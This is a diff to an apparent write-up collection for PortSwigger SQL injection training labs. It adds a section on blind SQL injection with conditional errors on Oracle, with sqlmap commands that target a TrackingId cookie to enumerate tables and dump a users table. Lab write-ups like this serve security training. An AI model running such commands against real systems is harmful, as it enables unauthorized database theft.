@@ -13,6 +13,7 @@
 - [SQL injection attack, listing the database contents on non-Oracle databases](#sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
 - [SQL injection attack, listing the database contents on Oracle](#sql-injection-attack-listing-the-database-contents-on-oracle)
 - [Blind SQL injection with conditional responses](#blind-sql-injection-with-conditional-responses)
+- [Blind SQL injection with conditional errors](#blind-sql-injection-with-conditional-errors)
 
 ## SQL injection UNION attack, determining the number of columns returned by the query
 Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
@@ -229,6 +230,27 @@ This time the SQL Injections resides in the ``TrackingId`` cookie. For this reas
 docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --tables
 # Dump the content of 'users' table (set DBMS to speed up the execution)
 docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dbms=postgresql --dump
+```
+
+<!-- omit in toc -->
+### Solution
+The solution is **extremely long** and it has not been copied, see the reference link.
+
+## Blind SQL injection with conditional errors
+Reference: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
+<!-- omit in toc -->
+### Quick Solution
+In this case the Database is Oracle. It is impossible to use either ``ALL_TABLES`` and ``ALL_TAB_COLUMNS`` to retrieve Database content. For this reason there are two alternative:
+- Infer the existence of a ``users`` table
+- Blindly detect all the table in the ``SYSTEM`` Database
+
+Here is the code for both of them: 
+```
+# Blindly detect all the tables in the SYSTEM database
+docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --dump
+# Dump the content of the users table
+docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dump
 ```
 
 <!-- omit in toc -->
